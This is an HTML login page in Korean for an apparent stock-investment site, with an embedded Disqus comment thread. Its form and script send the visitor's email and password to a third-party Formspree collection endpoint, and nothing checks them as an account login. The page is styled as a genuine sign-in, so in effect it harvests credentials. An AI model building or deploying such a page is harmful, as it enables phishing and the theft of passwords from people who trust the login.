<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>주식투자 로그인</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      font-family: 'Segoe UI', sans-serif;
      padding: 40px 16px;
    }

    .card {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 16px;
      padding: 48px 40px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
    }

    .logo {
      text-align: center;
      margin-bottom: 32px;
    }

    .logo-icon {
      font-size: 40px;
      margin-bottom: 8px;
    }

    .logo h1 {
      font-size: 22px;
      font-weight: 700;
      color: #ffffff;
      letter-spacing: -0.5px;
    }

    .logo p {
      font-size: 13px;
      color: rgba(255, 255, 255, 0.5);
      margin-top: 4px;
    }

    .form-group {
      margin-bottom: 18px;
    }

    label {
      display: block;
      font-size: 13px;
      color: rgba(255, 255, 255, 0.7);
      margin-bottom: 8px;
      font-weight: 500;
    }

    input {
      width: 100%;
      padding: 12px 16px;
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(255, 255, 255, 0.15);
      border-radius: 8px;
      color: #ffffff;
      font-size: 14px;
      outline: none;
      transition: border-color 0.2s, background 0.2s;
    }

    input::placeholder {
      color: rgba(255, 255, 255, 0.3);
    }

    input:focus {
      border-color: #4ade80;
      background: rgba(74, 222, 128, 0.05);
    }

    .btn {
      width: 100%;
      padding: 13px;
      background: linear-gradient(135deg, #4ade80, #22c55e);
      color: #0f2027;
      font-size: 15px;
      font-weight: 700;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 8px;
      transition: opacity 0.2s, transform 0.1s;
    }

    .btn:hover {
      opacity: 0.9;
      transform: translateY(-1px);
    }

    .btn:active {
      transform: translateY(0);
    }

    .success-msg {
      display: none;
      text-align: center;
      padding: 16px;
      background: rgba(74, 222, 128, 0.1);
      border: 1px solid rgba(74, 222, 128, 0.3);
      border-radius: 8px;
      color: #4ade80;
      font-size: 14px;
      margin-top: 16px;
    }

    .divider {
      text-align: center;
      color: rgba(255, 255, 255, 0.25);
      font-size: 12px;
      margin: 20px 0 0;
    }

    .comments-section {
      width: 100%;
      max-width: 720px;
      margin: 40px auto 60px;
      background: rgba(255, 255, 255, 0.04);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 16px;
      padding: 36px 40px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
    }

    .comments-title {
      font-size: 16px;
      font-weight: 600;
      color: rgba(255, 255, 255, 0.8);
      margin-bottom: 24px;
      padding-bottom: 14px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
    }

    #disqus_thread a {
      color: #4ade80 !important;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">
      <div class="logo-icon">📈</div>
      <h1>주식투자</h1>
      <p>계정에 로그인하세요</p>
    </div>

    <form id="login-form" action="https://formspree.io/f/mpqbwron" method="POST">
      <div class="form-group">
        <label for="email">이메일</label>
        <input
          type="email"
          id="email"
          name="email"
          placeholder="example@email.com"
          required
        />
      </div>

      <div class="form-group">
        <label for="password">비밀번호</label>
        <input
          type="password"
          id="password"
          name="password"
          placeholder="비밀번호를 입력하세요"
          required
        />
      </div>

      <button type="submit" class="btn">로그인</button>

      <div class="success-msg" id="success-msg">
        ✅ 로그인 요청이 전송되었습니다!
      </div>
    </form>

    <p class="divider">Powered by Formspree</p>
  </div>

  <section class="comments-section">
    <div class="comments-title">💬 댓글</div>
    <div id="disqus_thread"></div>
    <script>
      var disqus_config = function () {
        this.page.url = 'https://investment1-ao3.pages.dev/';
        this.page.identifier = 'investment1-main';
      };
      (function() {
        var d = document, s = d.createElement('script');
        s.src = 'https://investment1.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
      })();
    </script>
    <noscript>댓글을 보려면 JavaScript를 활성화하세요. <a href="https://disqus.com/?ref_noscript">Disqus로 제공되는 댓글</a></noscript>
  </section>

  <script>
    const form = document.getElementById('login-form');
    const successMsg = document.getElementById('success-msg');

    form.addEventListener('submit', async function (e) {
      e.preventDefault();

      const data = new FormData(form);

      const res = await fetch(form.action, {
        method: 'POST',
        body: data,
        headers: { Accept: 'application/json' },
      });

      if (res.ok) {
        successMsg.style.display = 'block';
        form.reset();
      } else {
        alert('전송에 실패했습니다. 다시 시도해 주세요.');
      }
    });
  </script>
</body>
</html>
